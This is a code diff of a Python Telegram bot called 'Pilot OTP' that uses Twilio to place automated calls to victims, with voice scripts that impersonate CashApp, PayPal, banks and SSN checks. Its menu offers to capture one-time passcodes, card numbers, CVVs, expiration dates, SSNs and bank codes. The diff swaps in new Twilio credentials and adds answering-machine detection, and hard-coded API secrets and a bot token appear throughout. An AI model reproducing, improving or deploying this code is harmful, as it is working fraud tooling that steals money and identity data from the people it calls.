@@ -5,16 +5,17 @@ from telebot import types
 import requests
 while True:
   try:
-    account_sid = 'AC9d71968b6bf85d109997458622a27d9d'
+    account_sid = 'AC4c3c793eac842346cef4820e46501295'
     callid = None
-    auth_token = '3de8ea71ad856404a743dac77709f8c7'
-    from_number = '+18445121223'
-    status_callback_url = 'https://d4e9-100-0-165-141.ngrok.io/call/status'
+    auth_token = '27ac8193bae177474d54c0fc4421578c'
+    from_number = '+15076691829'
+    status_callback_url = 'https://d9ac-100-0-165-141.ngrok.io/call/status'
     telegram_bot_token = '6096442307:AAEoN0VodeJjvtmwOQzFKBqKQRMBG75wh-M'
     telegram_bot = telebot.TeleBot(telegram_bot_token)
     @telegram_bot.message_handler(commands=['cashapp'])
     def cashapp_command(message):
         try:
+            print(message.from_user.id)
             r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
             if r.text == "200":
                 pass
@@ -32,11 +33,12 @@ while True:
         # Create the Twilio call
         client = Client(account_sid, auth_token)
         call = client.calls.create(
+            machine_detection='Enable',
             to=to_number,
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
-            status_callback_event=['initiated'],
-            url=f'https://d4e9-100-0-165-141.ngrok.io/voice/cashapp?name={name}&chanid={message.chat.id}'
+            status_callback_event=['Completed'],
+            url=f'https://d9ac-100-0-165-141.ngrok.io/voice/cashapp?name={name}&chanid={message.chat.id}'
         )
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
@@ -65,11 +67,12 @@ while True:
         # Create the Twilio call
         client = Client(account_sid, auth_token)
         call = client.calls.create(
+            machine_detection='Enable',
             to=to_number,
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
-            status_callback_event=['initiated'],
-            url=f'https://d4e9-100-0-165-141.ngrok.io/voice/paypal?name={name}&chanid={message.chat.id}')
+            status_callback_event=['Completed'],
+            url=f'https://d9ac-100-0-165-141.ngrok.io/voice/paypal?name={name}&chanid={message.chat.id}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -96,11 +99,12 @@ while True:
         # Create the Twilio call
         client = Client(account_sid, auth_token)
         call = client.calls.create(
+            machine_detection='Enable',
             to=to_number,
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
-            status_callback_event=['initiated'],
-            url=f'https://d4e9-100-0-165-141.ngrok.io/voice/bank?name={name}&chanid={message.chat.id}&bank={bank_name}')
+            status_callback_event=['Completed'],
+            url=f'https://d9ac-100-0-165-141.ngrok.io/voice/bank?name={name}&chanid={message.chat.id}&bank={bank_name}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -128,11 +132,12 @@ while True:
         # Create the Twilio call
         client = Client(account_sid, auth_token)
         call = client.calls.create(
+            machine_detection='Enable',
             to=to_number,
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
-            status_callback_event=['initiated'],
-            url=f'https://d4e9-100-0-165-141.ngrok.io/voice/ssn?name={name}&chanid={message.chat.id}&bank={bank_name}')
+            status_callback_event=['Completed'],
+            url=f'https://d9ac-100-0-165-141.ngrok.io/voice/ssn?name={name}&chanid={message.chat.id}&bank={bank_name}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -147,10 +152,7 @@ while True:
         button_text2 = "Server"
         button_data2 = 'server'
         button2 = types.InlineKeyboardButton(text=button_text2, callback_data=button_data2)
-        button_text3 = "Discord"
-        button_data3 = 'discord'
-        button3 = types.InlineKeyboardButton(text=button_text3, callback_data=button_data3)
-        keyboard = types.InlineKeyboardMarkup().add(button).add(button2).add(button3)
+        keyboard = types.InlineKeyboardMarkup().add(button).add(button2)
         message_text = "✈️ Pilot OTP\n\n🤖 Core Commands\n• 📖~ /help | view commands\n• 🎧~/setvoice | set language\n• ⏰~/plan | display your current plan\n\n📱Call Commands\n• 🔐~/otp | Capture OTP\n• 💳~/card | Capture Card Numbers\n• 💳~/cvv | Capture CVV\n• 💳~/vbv | Capture vbv\n• 📅~/date | Capture expiration date\n• 🪪~/ssn | Capture SSN\n• 🎉~/speak | Say any Text\n\n 🔗 Premade Commands\n• 🅿️~/paypal | Capture paypal\n• 💵~/cashapp | Capture Cashapp\n• 🏦~/bank | Capture 6 digit Bank Code\n• 📤~/venmo | Captures Venmo"
         telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard,parse_mode= 'Markdown')
   
